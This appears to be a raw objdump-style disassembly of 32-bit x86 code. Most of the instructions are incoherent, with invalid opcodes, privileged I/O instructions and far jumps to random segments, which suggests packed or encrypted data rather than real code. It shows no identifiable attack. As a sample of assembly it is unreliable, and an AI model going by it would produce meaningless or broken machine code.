  405963:	outs   dx,BYTE PTR ds:[esi]
  405964:	cld    
  405965:	adc    al,0x1c
  405967:	in     eax,dx
  405968:	push   esp
  405969:	adc    DWORD PTR [edi],esi
  40596b:	dec    esp
  40596c:	mov    ds:0x254f2a35,eax
  405971:	loop   0x4059d3
  405973:	cld    
  405974:	fwait
  405975:	xchg   ecx,eax
  405976:	imul   ebp,DWORD PTR [eax-0x25],0x7c
  40597a:	push   ebp
  40597b:	mov    ebp,0x113a213d
  405980:	into   
  405981:	cdq    
  405982:	aam    0x52
  405984:	mov    dh,0x8
  405986:	sbb    ah,BYTE PTR [ebp+0xa5684c1]
  40598c:	cmp    BYTE PTR [ecx+0x35],0x18
  405990:	sar    bh,0x60
  405993:	icebp  
  405994:	shl    DWORD PTR [ecx+0x2c],cl
  405997:	xchg   esp,eax
  405998:	cmp    ch,bl
  40599a:	cmp    eax,0x2b1c27bb
  40599f:	xchg   edx,eax
  4059a0:	pop    ebp
  4059a1:	jb     0x405968
  4059a3:	lods   al,BYTE PTR ds:[esi]
  4059a4:	mov    ch,0x27
  4059a6:	aam    0x2d
  4059a8:	fwait
  4059a9:	int    0x4c
  4059ab:	mov    ch,0x8
  4059ad:	mov    dl,0xcf
  4059af:	push   ebx
  4059b0:	xor    al,0x75
  4059b2:	cmp    al,0xe6
  4059b4:	mov    BYTE PTR [ebp+0x45],ah
  4059b7:	loope  0x40593e
  4059b9:	loopne 0x40594d
  4059bb:	in     eax,dx
  4059bc:	inc    ebx
  4059bd:	push   ss
  4059be:	mov    ah,0xf1
  4059c0:	jle    0x4059d4
  4059c2:	xchg   esi,eax
  4059c3:	push   edx
  4059c4:	xlat   BYTE PTR ds:[ebx]
  4059c5:	pop    ebx
  4059c6:	push   0x8eb5d81
  4059cb:	or     al,0x9f
  4059cd:	iret   
  4059ce:	stc    
  4059cf:	push   0x563d9f43
  4059d4:	aad    0x92
  4059d6:	add    ch,ch
  4059d8:	cdq    
  4059d9:	pop    esi
  4059da:	rcr    DWORD PTR [ecx],0x8
  4059dd:	adc    BYTE PTR [ebp+0x56a55fb3],bl
  4059e3:	rcl    DWORD PTR [eax],1
  4059e5:	shr    DWORD PTR [ebp-0x58ab2c9d],1
  4059eb:	mov    esi,0xe6517caf
  4059f0:	hlt    
  4059f1:	mov    dl,0x78
  4059f3:	and    edx,eax
  4059f5:	pop    esp
  4059f6:	pop    eax
  4059f7:	mov    ah,0x51
  4059f9:	adc    BYTE PTR [eax+0x6e79ca6e],0xd
  405a00:	stos   DWORD PTR es:[edi],eax
  405a01:	pusha  
  405a02:	aad    0x6d
  405a04:	pop    ss
  405a05:	mov    edi,0x8247442b
  405a0a:	sbb    al,0xdf
  405a0c:	or     eax,DWORD PTR [eax+0x1e]
  405a0f:	or     DWORD PTR [esi],eax
  405a11:	cmp    ch,BYTE PTR [edi+0x5b]
  405a14:	sbb    al,cl
  405a16:	aas    
  405a17:	jmp    0x6a45:0x60c15e96
  405a1e:	call   0x41df:0x274ffdbe
  405a25:	icebp  
  405a26:	dec    edi
  405a27:	arpl   WORD PTR [esi+0x67],cx
  405a2a:	xchg   esi,eax
  405a2b:	sbb    al,0x4a
  405a2d:	retf   
  405a2e:	jle    0x405a91
  405a30:	push   0x76040f4c
  405a35:	jno    0x405aa8
  405a37:	sub    edx,DWORD PTR [edi+edi*1]
  405a3a:	aas    
  405a3b:	icebp  
  405a3c:	out    dx,al
  405a3d:	xchg   ecx,eax
  405a3e:	pop    es
  405a3f:	fdiv   QWORD PTR [ebx+0x27]
  405a42:	std    
  405a43:	in     eax,0xce
  405a45:	das    
  405a46:	es repz scas al,BYTE PTR es:[edi]
  405a49:	cli    
  405a4a:	add    DWORD PTR [ebx+ebx*4-0x1a],esp
  405a4e:	push   edx
  405a4f:	aaa    
  405a50:	shl    esp,1
  405a52:	jmp    0x405a3a
  405a54:	in     al,0x99
  405a56:	mov    ecx,0x60cf40f6
  405a5b:	mov    al,ds:0xa373dd72
  405a60:	jns    0x405ab0
  405a62:	dec    esp
  405a63:	in     al,0x11
  405a65:	sbb    DWORD PTR [ecx],0xdd084138
  405a6b:	dec    edi
  405a6c:	push   0xca532787
  405a71:	xchg   esp,eax
  405a72:	fcomp  DWORD PTR ds:0x290e1f27
  405a78:	jp     0x405a33
  405a7a:	fwait
  405a7b:	test   al,al
  405a7d:	mov    ebp,DWORD PTR [ebx+edi*1-0x960821a]
  405a84:	adc    DWORD PTR [edi-0x3b11526b],edx
  405a8a:	adc    ebx,DWORD PTR [ebx+0x1d5eb3e4]
  405a90:	stos   DWORD PTR es:[edi],eax
  405a91:	lock jmp 0x609ad5a0
  405a97:	fstp   TBYTE PTR [ebx+ebx*4-0x33]
  405a9b:	js     0x405acc
  405a9d:	push   edi
  405a9e:	pop    ebx
  405a9f:	retf   0x425c
  405aa2:	jnp    0x405a44
  405aa4:	xor    al,0xb
  405aa6:	stos   BYTE PTR es:[edi],al
  405aa7:	lds    edi,FWORD PTR [edx-0x7ce6b408]
  405aad:	mov    ebp,0xb6c29019
  405ab2:	les    esi,FWORD PTR [edx+0x4d2cd8b2]
  405ab8:	sbb    BYTE PTR [esi],bh
  405aba:	sar    BYTE PTR [esi-0x293475b6],1
  405ac0:	ss inc ebp
  405ac2:	arpl   WORD PTR [eax],bp
  405ac4:	fcom   QWORD PTR [edi-0xb]
  405ac7:	add    ah,BYTE PTR [esi]
  405ac9:	pushf  
  405aca:	cmp    dl,ah
  405acc:	ficom  WORD PTR [ebx+0x2a]
  405acf:	cmp    dl,BYTE PTR [ecx+edi*2]
  405ad2:	cmp    DWORD PTR [ebp-0x5777b2b5],esi
  405ad8:	mov    ch,0x5
  405ada:	jecxz  0x405adc
  405adc:	inc    eax
  405add:	xchg   edx,eax
  405ade:	inc    ecx
  405adf:	fld    DWORD PTR [ebp-0x5f]
  405ae2:	(bad)  
  405ae3:	pop    ss
  405ae4:	loopne 0x405ad3
  405ae6:	imul   ebp,DWORD PTR [edi-0x691aebfb],0x5b
  405aed:	sub    edi,esp
  405aef:	adc    cl,BYTE PTR [ebx+ebx*1+0x50]
  405af3:	jbe    0x405b0a
  405af5:	loop   0x405b4c
  405af7:	sti    
  405af8:	pop    ebp
  405af9:	xchg   ecx,eax
  405afa:	cmp    eax,0xaaf7897
  405aff:	lahf   
  405b00:	dec    ebp
  405b01:	xchg   DWORD PTR [ecx-0x25],ebx
  405b04:	add    BYTE PTR [ecx],bh
  405b06:	out    dx,al
  405b07:	out    0xaa,al
  405b09:	adc    ch,0x48
  405b0c:	inc    esi
  405b0d:	sbb    ah,BYTE PTR [esi+0x3]
  405b10:	(bad)  
  405b11:	ins    BYTE PTR es:[edi],dx
  405b12:	and    al,bh
  405b14:	sahf   
  405b15:	stc    
  405b16:	das    
  405b17:	add    BYTE PTR [eax+0x892b396],al
  405b1d:	(bad)  
  405b1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b1f:	xchg   esp,eax
  405b20:	pop    eax
  405b21:	push   ss
  405b22:	jo     0x405b3e
  405b24:	sbb    DWORD PTR ds:0xaa830232,ecx
  405b2a:	pop    ecx
  405b2b:	js     0x405abf
  405b2d:	loop   0x405b2b
  405b2f:	mov    al,BYTE PTR [esi]
  405b31:	and    DWORD PTR [eax-0x40],0xc5076f73
  405b38:	pop    esi
  405b39:	data16 mov BYTE PTR [esi-0x1d4d965d],cl
  405b40:	aas    
  405b41:	adc    edi,DWORD PTR [esi]
  405b43:	js     0x405b7b
  405b45:	ins    BYTE PTR es:[edi],dx
  405b46:	fisub  WORD PTR [esi+0x30]
  405b49:	aam    0xb
  405b4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b4c:	jbe    0x405b9a
  405b4e:	mov    bh,0xff
  405b50:	xchg   BYTE PTR [edi+edx*8+0x1b],ah
  405b54:	mov    dl,0x7c
  405b56:	jmp    0x405bd3
  405b58:	sub    eax,0x730534db
  405b5d:	jno    0x405b3c
  405b5f:	(bad)  
  405b60:	fwait
  405b61:	out    dx,al
  405b62:	cdq    
  405b63:	jle    0x405b2b
  405b65:	shl    BYTE PTR [eax-0x1e],1
  405b68:	stc    
  405b69:	dec    esp
  405b6a:	mov    BYTE PTR [edx+ebx*8],dh
  405b6d:	sti    
  405b6e:	gs addr16 sbb al,0x76
  405b72:	or     esp,DWORD PTR [edx-0x6c]
  405b75:	fbld   TBYTE PTR [ecx]
  405b77:	sbb    DWORD PTR [ecx-0x25],esi
  405b7a:	mov    cl,0x4f
  405b7c:	mov    ecx,0xac36ee97
  405b81:	mov    BYTE PTR [edx+0x8],dh
  405b84:	adc    dh,BYTE PTR [eax+0x6e]
  405b87:	loop   0x405bbf
  405b89:	iret   
  405b8a:	jno    0x405b7b
  405b8c:	mov    bl,0xcd
  405b8e:	es mov ah,0xb
  405b91:	mov    BYTE PTR [edi],dh
  405b93:	mov    dh,BYTE PTR [eax]
  405b95:	add    DWORD PTR [ebx-0x40e9f2cb],esp
  405b9b:	dec    ebx
  405b9c:	or     DWORD PTR [edi],esp
  405b9e:	fild   DWORD PTR [esi+eax*8]
  405ba1:	shl    BYTE PTR [edx+0x45],cl
  405ba4:	push   ecx
  405ba5:	xchg   ebp,eax
  405ba6:	sbb    DWORD PTR [ecx],0x3e44a660
  405bac:	jp     0x405c14
  405bae:	hlt    
  405baf:	mov    ebp,DWORD PTR [edi-0x63]
  405bb2:	aam    0x5b
  405bb4:	push   ebx
  405bb5:	sbb    bl,BYTE PTR [ebp+0x436c97b9]
  405bbb:	mov    ds:0x68a891ea,eax
  405bc0:	adc    eax,0x5f66bc5c
  405bc5:	jmp    0x405b89
  405bc7:	jo     0x405b94
  405bc9:	push   cs
  405bca:	and    esp,ebp
  405bcc:	mov    ebx,0xffa578c3
  405bd1:	adc    edi,eax
  405bd3:	mov    ds:0x5425d1ff,al
  405bd8:	inc    edi
  405bd9:	repnz arpl bx,ax
  405bdc:	aas    
  405bdd:	call   0xb133:0xbd0915d1
  405be4:	pusha  
  405be5:	and    eax,DWORD PTR [ebx-0x7732a7e8]
  405beb:	aad    0xad
  405bed:	leave  
  405bee:	(bad)  
  405bf0:	iret   
  405bf1:	pop    ebp
  405bf2:	rol    ebp,1
  405bf4:	outs   dx,BYTE PTR ds:[esi]
  405bf5:	ret    
  405bf6:	sahf   
  405bf7:	fmul   QWORD PTR [ecx]
  405bf9:	dec    edi
  405bfa:	ss xor al,0x95
  405bfd:	add    DWORD PTR [eax+0x37],edx
  405c00:	ins    BYTE PTR es:[edi],dx
  405c01:	jecxz  0x405bb3
  405c03:	adc    ecx,0x78
  405c06:	xor    al,0x41
  405c08:	fistp  DWORD PTR [ebp-0x5b]
  405c0b:	or     al,0x69
  405c0d:	push   esi
  405c0e:	and    edi,ecx
  405c10:	fdiv   DWORD PTR [ebp-0x694520b]
  405c16:	test   DWORD PTR [edx-0x34dcbbdd],edx
  405c1c:	int3   
  405c1d:	sti    
  405c1e:	mov    al,ds:0x38729410
  405c23:	adc    ah,BYTE PTR [edi+ecx*4]
  405c26:	ficom  DWORD PTR [eax]
  405c28:	cmc    
  405c29:	and    BYTE PTR [edx+edi*4-0x2f75ad4b],0x68
  405c31:	stc    
  405c32:	fist   WORD PTR [ebx]
  405c34:	adc    BYTE PTR [edi+0x20e9d941],bh
  405c3a:	jne    0x405c54
  405c3c:	add    al,0xa
  405c3e:	xchg   DWORD PTR [esi+0x3b2f8ddb],edx
  405c44:	inc    esp
  405c45:	mov    dl,0xa7
  405c47:	inc    ecx
  405c48:	or     ebp,DWORD PTR [edi]
  405c4a:	addr16 mov eax,0x665015af
  405c50:	ins    BYTE PTR es:[edi],dx
  405c51:	cdq    
  405c52:	sahf   
  405c53:	mov    eax,0x667a4f98
  405c58:	aaa    
  405c59:	jge    0x405c77
  405c5b:	aaa    
  405c5c:	mov    esi,0x5fba2da1
  405c61:	xor    ch,BYTE PTR [eax-0x9095692]
  405c67:	dec    eax
  405c68:	in     eax,0xb0
  405c6a:	sbb    al,0xb0
  405c6c:	dec    edx
  405c6d:	rdpmc  
  405c6f:	jge    0x405c33
  405c71:	pop    es
  405c72:	dec    edx
  405c73:	out    0x40,al
  405c75:	leave  
  405c76:	cdq    
  405c77:	inc    edx
  405c78:	es repnz push es
  405c7b:	dec    edi
  405c7c:	adc    dh,ch
  405c7e:	into   
  405c7f:	les    ebp,FWORD PTR [edi+0x36]
  405c82:	pop    eax
  405c83:	fstp   DWORD PTR [ecx+esi*8+0xb]
  405c87:	and    bh,BYTE PTR [ecx]
  405c89:	sahf   
  405c8a:	xchg   ecx,eax
  405c8b:	xchg   edi,eax
  405c8c:	jmp    0xab05197
  405c91:	mov    cs,ecx
  405c93:	aad    0x77
  405c95:	retf   0x3548
  405c98:	fild   QWORD PTR [edx-0xc]
  405c9b:	ds jmp 0xc027a67f
  405ca1:	ins    BYTE PTR es:[edi],dx
  405ca2:	xchg   esp,eax
  405ca3:	call   0x3259:0x2d99c3e8
  405caa:	jmp    FWORD PTR [ebp-0x79]
  405cad:	or     ebp,DWORD PTR [edx+0x6cbf16a4]
  405cb3:	mov    ah,ah
  405cb5:	or     dl,ch
  405cb7:	test   BYTE PTR [ebx-0x17],dh
  405cba:	push   es
  405cbb:	leave  
  405cbc:	gs inc edx
  405cbe:	jg     0x405cd6
  405cc0:	leave  
  405cc1:	shr    edx,1
  405cc3:	mov    gs,esi
  405cc5:	push   es
  405cc6:	or     DWORD PTR [ecx+0x137c3fef],esp
  405ccc:	and    esi,eax
  405cce:	push   es
  405ccf:	imul   DWORD PTR [esp+eax*2-0x79]
  405cd3:	sub    eax,0xb08a8193
  405cd8:	imul   eax,ecx,0xffffffe8
  405cdb:	loop   0x405d2b
  405cdd:	jge    0x405cf9
  405cdf:	loop   0x405cb0
  405ce1:	and    dh,BYTE PTR [esi]
  405ce3:	fstp   TBYTE PTR [ebp+0x44]
  405ce6:	add    DWORD PTR [ecx],esi
  405ce8:	cwde   
  405ce9:	test   BYTE PTR [ebx],cl
  405ceb:	push   edi
  405cec:	push   ss
  405ced:	inc    esp
  405cee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405cef:	push   ds
  405cf0:	bound  edi,QWORD PTR [si+0x59e]
  405cf5:	adc    esp,eax
  405cf7:	retf   0xa97d
  405cfa:	out    dx,al
  405cfb:	in     eax,dx
  405cfc:	loop   0x405ca1
  405cfe:	data16 loope 0x405cb0
  405d01:	jmp    0x405d45
  405d03:	enter  0xc841,0x25
  405d07:	mov    ch,BYTE PTR [edi-0x3d]
  405d0a:	lea    eax,[ebp-0x5e]
  405d0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d0e:	xchg   ecx,eax
  405d0f:	fsub   QWORD PTR [esi+0x291fde8a]
  405d15:	fldcw  WORD PTR [eax]
  405d17:	out    dx,al
  405d18:	sar    BYTE PTR [ecx],1
  405d1a:	pop    ss
  405d1b:	pushf  
  405d1c:	xchg   esi,eax
  405d1d:	or     ah,dl
  405d1f:	out    0x3f,eax
  405d21:	sbb    BYTE PTR [edx-0x6c],ah
  405d24:	adc    DWORD PTR [ebx-0x30],0x4a
  405d28:	mov    ds:0xf986cd,eax
  405d2d:	(bad)  
  405d2e:	test   dh,0x7f
  405d31:	sti    
  405d32:	(bad)  
  405d33:	inc    esp
  405d34:	jbe    0x405ce1
  405d36:	stos   DWORD PTR es:[edi],eax
  405d37:	popa   
  405d38:	mov    ebp,0xcf6368d2
  405d3d:	mov    eax,fs:0xa65166c2
  405d43:	data16 fcom DWORD PTR [edx]
  405d46:	in     al,dx
  405d47:	daa    
  405d48:	adc    dh,BYTE PTR [esi]
  405d4a:	mov    cl,0xa8
  405d4c:	pop    esp
  405d4d:	jge    0x405d38
  405d4f:	dec    ebp
  405d50:	cld    
  405d51:	lds    esi,FWORD PTR [ebx-0x14]
  405d54:	jmp    0x2a87ca72
  405d59:	sbb    ebp,edx
  405d5b:	loop   0x405ced
  405d5d:	push   ecx
  405d5e:	cmp    al,0xcb
  405d60:	pop    ebp
  405d61:	fst    DWORD PTR [edx-0x4987d49]
  405d67:	jmp    0x5468:0x65d5b30c
  405d6e:	mov    esi,0xe83721a3
  405d73:	pop    ss
  405d74:	lds    ebp,FWORD PTR [eax+edi*1-0x5f2d8350]
  405d7b:	jb     0x405d51
  405d7d:	jnp    0x405dfb
  405d7f:	jae    0x405d6f
  405d81:	aas    
  405d82:	jp     0x405df9
  405d84:	inc    eax
  405d85:	popa   
  405d86:	pop    esp
  405d87:	cmp    eax,0xdeca80c7
  405d8c:	clc    
  405d8d:	inc    esi
  405d8e:	mov    al,ds:0xf17d53bf
  405d93:	jmp    0xd716d0b3
  405d98:	pop    edi
  405d99:	jge    0x405df2
  405d9b:	inc    ebp
  405d9c:	xchg   ecx,eax
  405d9d:	ins    BYTE PTR es:[edi],dx
  405d9e:	out    dx,eax
  405d9f:	call   0x347c2e6c
  405da4:	jle    0x619b4ee
  405daa:	sub    ch,BYTE PTR [eax]
  405dac:	sub    eax,0x26eab288
  405db1:	fisttp DWORD PTR [esi+0x7]
  405db4:	shr    BYTE PTR [ebx-0x58],0x79
  405db8:	outs   dx,BYTE PTR ds:[esi]
  405db9:	inc    esi
  405dba:	fldenv [ebx-0x5adcce59]
  405dc0:	mov    al,ds:0x78d8778a
  405dc5:	push   0x85bf01b0
  405dca:	add    BYTE PTR [ecx],ah
  405dcc:	ret    
  405dcd:	and    eax,0x37d09c55
  405dd2:	inc    edi
  405dd3:	cdq    
  405dd4:	mov    eax,0x39b3eb36
  405dd9:	xchg   edi,eax
  405dda:	mov    dl,0xd5
  405ddc:	push   ss
  405ddd:	repz jno 0x405dae
  405de0:	ss cld 
  405de2:	fld    DWORD PTR [esi-0x522c3357]
  405de8:	mov    cl,BYTE PTR [ebx-0x72]
  405deb:	adc    eax,0xd24aee3c
  405df0:	ins    BYTE PTR es:[edi],dx
  405df1:	and    al,0xd4
  405df3:	mov    ch,0xb4
  405df5:	xchg   edx,eax
  405df6:	jne    0x405df2
  405df8:	jb     0x405e41
  405dfa:	enter  0x1dc7,0x93
  405dfe:	mov    ecx,0x4f418dd6
  405e03:	(bad)  [ebp-0xd58f462]
  405e09:	stos   DWORD PTR es:[edi],eax
  405e0a:	dec    ebp
  405e0b:	outs   dx,BYTE PTR ds:[esi]
  405e0c:	icebp  
  405e0d:	or     ah,ch
  405e0f:	(bad)  
  405e10:	sub    ebp,DWORD PTR es:[ecx-0x4d]
  405e14:	enter  0x437c,0xf3
  405e18:	call   0x5bdec1eb
  405e1d:	aas    
  405e1e:	scas   eax,DWORD PTR es:[edi]
  405e1f:	bound  esi,QWORD PTR [edi+edx*8+0x7f50d19a]
  405e26:	xchg   edi,eax
  405e27:	test   DWORD PTR [ebp-0x24],edi
  405e2a:	push   eax
  405e2b:	xor    eax,0xb400a2b2
  405e30:	pop    ebp
  405e31:	int    0x93
  405e33:	pop    ebx
  405e34:	cmp    dh,BYTE PTR [ebx+0x1fa9f2a1]
  405e3a:	xchg   esi,eax
  405e3b:	data16 mov es,WORD PTR [edx+0x5cd05cd6]
  405e42:	sub    ebx,esi
  405e44:	inc    esi
  405e45:	push   esi
  405e46:	dec    edi
  405e47:	dec    edi
  405e48:	add    eax,0x7edf6593
  405e4d:	and    DWORD PTR [edx+0x48],edi
  405e50:	enter  0xbf3f,0x4e
  405e54:	scas   al,BYTE PTR es:[edi]
  405e55:	mov    dh,0x6
  405e57:	rcl    DWORD PTR ss:[edi+0x16],0x2e
  405e5c:	sub    eax,0xc387e0b8
  405e61:	fst    QWORD PTR [edx+eax*2+0x3fe65ccf]
  405e68:	jo     0x405e21
  405e6a:	push   ebx
  405e6b:	mov    ch,0xc
  405e6d:	push   ss
  405e6e:	gs out dx,eax
  405e70:	xchg   ebp,eax
  405e71:	sbb    al,0x6f
  405e73:	mov    eax,ds:0x1b2128b9
  405e78:	xchg   ecx,eax
  405e79:	xor    BYTE PTR [esi*4+0x5135f891],dl
  405e80:	cmp    al,0x0
  405e82:	into   
  405e83:	lods   al,BYTE PTR ds:[esi]
  405e84:	mov    ds:0x8c6459dc,eax
  405e89:	popa   
  405e8a:	cmp    eax,0xfad4edb5
  405e8f:	cmp    eax,0x5d5d9fc1
  405e94:	addr16 or eax,eax
  405e97:	mov    ebp,0x8f056915
  405e9c:	enter  0x2ce1,0xb2
  405ea0:	lods   al,BYTE PTR ds:[si]
  405ea2:	mov    esp,0xfb8f796f
  405ea7:	fistp  DWORD PTR [esi+eax*1]
  405eaa:	mov    esp,DWORD PTR [eax+ebx*8-0x2ea54cd2]
  405eb1:	test   al,0xb4
  405eb3:	mov    eax,0x817d4f3
  405eb8:	cld    
  405eb9:	(bad)  
  405eba:	std    
  405ebb:	push   esi
  405ebc:	push   0xffffffa8
  405ebe:	xchg   edi,eax
  405ebf:	hlt    
  405ec0:	pop    ebp
  405ec1:	icebp  
  405ec2:	xchg   edx,eax
  405ec3:	sbb    al,0x4
  405ec5:	pop    edi
  405ec6:	fld    DWORD PTR [edi-0x29391465]
  405ecc:	pop    esi
  405ecd:	aas    
  405ece:	fcmovne st,st(4)
  405ed0:	push   0xef302ad
  405ed5:	das    
  405ed6:	ret    0xb302
  405ed9:	out    0x37,eax
  405edb:	inc    ebx
  405edc:	jmp    DWORD PTR [ecx+0x79]
  405edf:	pop    ds
  405ee0:	lods   eax,DWORD PTR ds:[esi]
  405ee1:	(bad)  
  405ee2:	out    0x92,eax
  405ee4:	push   0xe156e629
  405ee9:	fdivr  QWORD PTR [eax]
  405eeb:	and    al,bh
  405eed:	mov    DWORD PTR [ebx],esi
  405eef:	add    eax,0x4a4ca470
  405ef4:	call   0x81c8:0xa8aea5cc
  405efb:	xchg   esi,eax
  405efc:	jecxz  0x405eae
  405efe:	jle    0x405edc
  405f00:	xor    edx,eax
  405f02:	addr16 mov edi,0x6a1d40b6
  405f08:	and    eax,0xf2265877
  405f0d:	or     eax,0x537eb42
  405f12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f13:	mov    ch,0xaf
  405f15:	or     eax,0xe8e50460
  405f1a:	cdq    
  405f1b:	fadd   DWORD PTR [ebx]
  405f1d:	adc    BYTE PTR [edi-0x379babdb],bl
  405f23:	dec    ecx
  405f24:	dec    eax
  405f25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f26:	daa    
  405f27:	jp     0x405eb5
  405f29:	and    esp,DWORD PTR [ebx+0x1da52e8]
  405f2f:	lds    esi,FWORD PTR [ecx-0x24]
  405f32:	js     0x405f1c
  405f34:	test   al,0x88
  405f36:	fs cmp edx,eax
  405f39:	jnp    0x405f44
  405f3b:	nop
  405f3c:	(bad)  
  405f3d:	sbb    esp,DWORD PTR [ebx+0x62f72a4b]
  405f43:	mov    BYTE PTR [esi],ah
  405f45:	bound  esp,QWORD PTR [esi-0x6ed5e39]
  405f4b:	and    ah,bh
  405f4d:	cmc    
  405f4e:	lock mov ds,edx
  405f51:	lods   eax,DWORD PTR ds:[esi]
  405f52:	enter  0x2c45,0x9e
  405f56:	adc    BYTE PTR [edi],0x1
  405f59:	fld    TBYTE PTR [ebx-0xf]
  405f5c:	xchg   edx,eax
  405f5d:	mov    al,ds:0x38857388
  405f62:	cs addr16 pop esi
  405f65:	and    al,0x30
  405f67:	xor    bl,ch
  405f69:	(bad)  
  405f6a:	pop    esp
  405f6b:	cwde   
  405f6c:	add    ebx,0xffffffbf
  405f6f:	and    ah,dl
  405f71:	inc    edx
  405f72:	mov    al,0x71
  405f74:	mov    bh,al
  405f76:	cmp    dh,BYTE PTR [eax-0x49b520ca]
  405f7c:	pop    eax
  405f7d:	sbb    BYTE PTR [ebp+0xf],bl
  405f80:	(bad)  
  405f82:	pushf  
  405f83:	lahf   
  405f84:	adc    esi,DWORD PTR [esi]
  405f86:	add    DWORD PTR [eax],0x7a
  405f89:	mov    ds:0xd29added,al
  405f8e:	sbb    BYTE PTR [eax-0x2a],cl
  405f91:	in     al,0x16
  405f93:	aaa    
  405f94:	inc    ecx
  405f95:	cli    
  405f96:	or     eax,0xcb78808f
  405f9b:	clc    
  405f9c:	sbb    BYTE PTR [esi-0x776f7fb7],ch
  405fa2:	add    ebp,ebx
  405fa4:	jbe    0x405fac
  405fa6:	push   ss
  405fa7:	das    
  405fa8:	pop    esp
  405fa9:	fmul   st,st(6)
  405fab:	icebp  
  405fac:	sti    
  405fad:	popf   
  405fae:	jns    0x406026
  405fb0:	aam    0x7e
  405fb2:	mov    ebp,0x328826e2
  405fb7:	sub    ebp,eax
  405fb9:	or     DWORD PTR [ecx],eax
  405fbb:	adc    eax,0xeac7462f
  405fc0:	jo     0x405f96
  405fc2:	add    BYTE PTR es:[ecx-0x4a93c37e],0x2c
  405fca:	scas   eax,DWORD PTR es:[edi]
  405fcb:	arpl   WORD PTR [eax+0x48ebff3f],dx
  405fd1:	fwait
  405fd2:	mov    ah,0x99
  405fd4:	mov    al,ds:0xa3840e2a
  405fd9:	les    ebx,FWORD PTR [edx]
  405fdb:	xchg   esi,eax
  405fdc:	stc    
  405fdd:	mov    ebx,ds
  405fdf:	scas   eax,DWORD PTR es:[edi]
  405fe0:	push   es
  405fe1:	jno    0x406033
  405fe3:	xor    dl,BYTE PTR [ecx]
  405fe5:	inc    ebx
  405fe6:	ss cdq 
  405fe8:	mov    edi,0xcc7272
  405fed:	pop    eax
  405fee:	cli    
  405fef:	cld    
  405ff0:	out    dx,al
  405ff1:	in     al,dx
  405ff2:	mov    eax,ds:0x9fc4c787
  405ff7:	push   es
  405ff8:	push   eax
  405ff9:	pop    eax
  405ffa:	inc    edi
  405ffb:	pop    ecx
  405ffc:	nop
  405ffd:	call   0x90c7b13f
  406002:	or     DWORD PTR [edi+0x4f4f2bcf],esp
  406008:	leave  
  406009:	mov    al,0x47
  40600b:	enter  0x8479,0xa
  40600f:	or     ecx,DWORD PTR [esi]
  406011:	sbb    edi,DWORD PTR [edi+0x1b]
  406014:	xor    eax,0xcefbeb39
  406019:	xor    BYTE PTR ds:0xf91660e7,cl
  40601f:	mov    cl,BYTE PTR [esp+eax*2+0x3583811f]
  406026:	mov    esp,0xf1754248
  40602b:	stos   DWORD PTR es:[edi],eax
  40602c:	cmp    eax,0x3edb7a8e
  406031:	arpl   si,dx
  406033:	in     al,0xaf
  406035:	outs   dx,BYTE PTR ds:[esi]
  406036:	ss sbb eax,0xb6e1b61f
  40603c:	out    0x59,al
  40603e:	imul   ebp,DWORD PTR [esi],0x2a
  406041:	into   
  406042:	push   ebp
  406043:	sbb    al,0xc1
  406045:	pop    ds
  406046:	jbe    0x40609c
  406048:	mov    edi,cs
  40604a:	mov    ebx,0x7dbdadd9
  40604f:	mov    bl,0x3
  406051:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406052:	loope  0x40604c
  406054:	jae    0x4060ce
  406056:	mov    bl,BYTE PTR [edi]
  406058:	adc    al,0x81
  40605a:	pop    esp
  40605b:	mov    ah,0x22
  40605d:	dec    esi
  40605e:	and    esp,DWORD PTR [ebx-0xc9b0cc3]
  406064:	jo     0x4060ba
  406066:	cwde   
  406067:	addr16 sbb eax,ebp
  40606a:	xor    bh,BYTE PTR [ebx+0x1dd6d293]
  406070:	mov    eax,0x98e7e324
  406075:	fst    QWORD PTR [ebp-0x7ae9ee8a]
  40607b:	lds    ebp,FWORD PTR [ebp+0x6f]
  40607e:	cmp    dh,BYTE PTR [eax+0x7febc09c]
  406084:	lock mov ebx,0xf9945a01
  40608a:	mov    al,0x2d
  40608c:	jmp    0xa36e:0x38384b20
  406093:	gs ja  0x40605b
  406096:	loope  0x4060a5
  406098:	ror    BYTE PTR [ebx+0x1c1035fe],0xea
  40609f:	add    ebp,ecx
  4060a1:	mov    edi,0xce1bd79a
  4060a6:	ins    BYTE PTR es:[edi],dx
  4060a7:	mov    al,cl
  4060a9:	add    eax,0xe4a73b64
  4060ae:	sub    dl,BYTE PTR [ecx]
  4060b0:	xchg   edi,eax
  4060b1:	dec    eax
  4060b2:	arpl   bx,bp
  4060b4:	sbb    ebx,DWORD PTR [esi]
  4060b6:	xor    DWORD PTR [ebx+eiz*1],ebx
  4060b9:	mov    esi,0x7d84d2ff
  4060be:	xchg   ebp,eax
  4060bf:	xchg   esi,eax
  4060c0:	in     al,dx
  4060c1:	dec    ebp
  4060c2:	cdq    
  4060c3:	cmp    eax,0xbf5ffa1c
  4060c8:	dec    ecx
  4060c9:	cmp    esp,DWORD PTR [ebx+0x6de8a431]
  4060cf:	sub    al,ch
  4060d1:	push   ds
  4060d2:	jb     0x406127
  4060d4:	mov    esp,0xc34325e1
  4060d9:	test   al,0x6
  4060db:	out    0xa4,eax
  4060dd:	sub    esi,edx
  4060df:	ret    0x3aab
  4060e2:	mov    esp,0x18c432af
  4060e7:	out    0x78,al
  4060e9:	inc    ebx
  4060ea:	sub    DWORD PTR [esi],edi
  4060ec:	rcl    BYTE PTR [esi],1
  4060ee:	pop    eax
  4060ef:	loope  0x40611b
  4060f1:	mov    ah,0xdd
  4060f3:	mov    eax,ds:0x22204998
  4060f8:	mov    WORD PTR [ebp+0x7a],ss
  4060fb:	scas   al,BYTE PTR es:[edi]
  4060fc:	mov    DWORD PTR [ecx-0x7407f4b4],ebp
  406102:	pop    eax
  406103:	or     dh,bh
  406105:	cs pop es
  406107:	mov    BYTE PTR [edx+ebx*1],al
  40610a:	mov    eax,DWORD PTR [ebp-0x40]
  40610d:	mov    edx,DWORD PTR [ebp-0x28]
  406110:	xor    eax,esi
  406112:	xor    edx,esi
  406114:	add    eax,edi
  406116:	add    edx,edi
  406118:	imul   eax,edx
  40611b:	add    eax,DWORD PTR [ebp-0xc]
  40611e:	mov    DWORD PTR [ebp-0xc],eax
